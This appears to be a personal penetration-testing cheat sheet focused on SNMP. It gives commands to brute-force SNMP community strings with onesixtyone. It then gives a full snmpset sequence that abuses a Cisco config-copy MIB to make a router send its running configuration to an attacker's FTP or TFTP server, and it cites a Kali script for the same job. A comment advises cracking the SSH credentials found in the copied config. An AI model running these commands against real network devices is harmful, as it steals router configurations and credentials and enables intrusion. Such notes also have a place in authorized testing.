# EVERY VILLAIN IS LEMONS
This file contains all the eeevvvvil pentesting notes, handy commands, and the like that could be found useful. Organized by protocol (or environment) and tool.

## SNMP
- Run `onesixtyone` to guess some SNMP strings:
  ```
  wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -o snmp-strings.txt
  onesixtyone -c snmp-strings.txt -i hosts.txt -o onesixtyone-snmp-guess.txt
  ```
- Set up FTP server and FTP using a SNMP write string. Similar method for TFTP (which doesn't try to auth but could be blocked). Check the blog for TFTP instructions. Remember to have a 777 file in the TFTP root you're using.
  ```
  # Install FTP server.
  # See https://www.ciscozine.com/how-to-save-configurations-using-snmp/
  sudo apt-get install pure-ftpd
  sudo adduser ftpman --home /tmp/
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.2.1337 i 2
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.3.1337 i 4
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.4.1337 i 1
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.5.1337 a 10.10.10.10
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.6.1337 s running.config
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.7.1337 s ftpman
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.8.1337 s ftpmanPASS
  snmpwalk -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
  snmpwalk -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
  snmpset -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1.14.1337 i 2
  snmpwalk -c 'everyvillainislemons' -v 2c 10.113.163.1 1.3.6.1.4.1.9.9.96.1.1.1.1
  ```
- Do it over TFTP:
  ```
  # 336 is the ID, it lasts 5 minutes. You can clear it if needed.
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.2.336 i 1
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.3.336 i 4
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.4.336 i 1
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.5.336 a [ip-tftp-server]
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.6.336 s [file-name]   # don't forget touch && chmod 777
  snmpset -c [snmp-community-string] -v 2c [ip-device] 1.3.6.1.4.1.9.9.96.1.1.1.1.14.336 i 1
  ```
- `muts` wrote a [quick perl script to copy over the config](https://tools.kali.org/information-gathering/copy-router-config), native to Kali:
  ```
  copy-router-config.pl target_router evil_tftp_server private_snmp_string
  # Modify the file appropriately, crack the SSH creds, etc.
  # Check the similar merge-router-config.pl
  ```
